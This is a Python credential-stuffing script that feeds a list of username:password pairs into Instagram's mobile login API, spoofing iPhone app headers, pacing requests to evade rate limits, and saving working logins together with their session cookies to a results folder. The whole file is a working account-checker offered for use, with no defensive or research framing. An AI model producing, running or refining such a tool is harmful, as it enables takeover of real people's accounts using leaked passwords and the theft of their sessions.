import requests, uuid, queue, time, os, datetime

datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

q = queue.Queue()
SLEEP = 10

try:
    os.mkdir('result')
except:
    pass

directory = os.path.join(os.path.join(os.getcwd(),'result'),datetime.datetime.now().strftime("%Y-%m-%d %H-%M-%S"))
os.mkdir(directory)

url = 'https://i.instagram.com/api/v1/accounts/login/'

headers = {'User-Agent':'Instagram 125.0.0.18.125 (iPhone11,8; iOS 13_3; en_US; en-US; scale=2.00; 828x1792; 193828684)', 
    'Accept':'*/*', 
    'Accept-Encoding':'gzip, deflate', 
    'Accept-Language':'en-US', 
    'X-IG-Capabilities':'3brTvw==', 
    'X-IG-Connection-Type':'WIFI', 
    'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
    'Host':'i.instagram.com'}

def login(Username,Password):

    uid = uuid.uuid4()
    data = {'_uuid':uid, 
        'username':Username, 
        'enc_password':f"#PWD_INSTAGRAM_BROWSER:0:1589682409:{Password}", 
        'queryParams':'{}', 
        'optIntoOneTap':'false', 
        'device_id':uid, 
        'from_reg':'false', 
        '_csrftoken':'missing', 
        'login_attempt_count':'0'}
        
    try:
        reqlogin = requests.post(url, headers=(headers), data=data)

    except:
        return {'status':'badRequest','data':''}

    if 'logged_in_user' in reqlogin.text:
        try:
            sessionid = reqlogin.cookies.get_dict()['sessionid']
        except:
            sessionid = 'notAvailable'    
    
        return {'status':'logined','data':sessionid}

    elif 'The password you entered is incorrect.' in reqlogin.text:
        return {'status':'badPassword','data':''}
    
    elif "challenge_required" in reqlogin.text:
        return {'status':'challenge','data':''}
    
    elif "The username you entered doesn't appear to belong to an account" in reqlogin.text:
        return {'status':'badUsername','data':''}
    
    else:
        return {'status':'badKeycheck','data':reqlogin.text}

def main(combo):
    global SLEEP
    combo = combo.strip()
    try :
        Username = combo.split(":")[0]
        Password = combo.split(":")[1]
    except:
        return {'status':'badCombo'}

    Response = login(Username,Password)
    print(Response)
    if Response['status'] == 'logined':
        SLEEP = 10
        open(os.path.join(directory,"logined.txt"), "a+").write(f"{str((combo,Response['data']))}\n")

    elif Response['status'] == 'challenge':
        SLEEP = 15
        open(os.path.join(directory,"challenge.txt"), "a+").write(f'{combo}\n')

    elif Response['status'] == 'badPassword':
        SLEEP = 20
        open(os.path.join(directory,"badPassword.txt"), "a+").write(f'{combo}\n')
    
    elif Response['status'] == 'badUsername':
        SLEEP = 10
        open(os.path.join(directory,"badUsername.txt"), "a+").write(f'{combo}\n')
    
    elif Response['status'] == 'badRequest':
        SLEEP = 10
        q.put(combo)

    elif Response['status'] == 'badKeycheck':
        SLEEP = 10
        open(os.path.join(directory,"badKeyCheck.txt"), "a+").write(f'{combo}\n')

if __name__ == "__main__":
    userListName = input('[~] Please Enter User list File Name: ')
    UserList = open(userListName,'r+').readlines()
    
    for a in UserList:
        if ':' in a:
            q.put(a)

    while q.empty() == False:
        main(q.get())
        time.sleep(SLEEP)
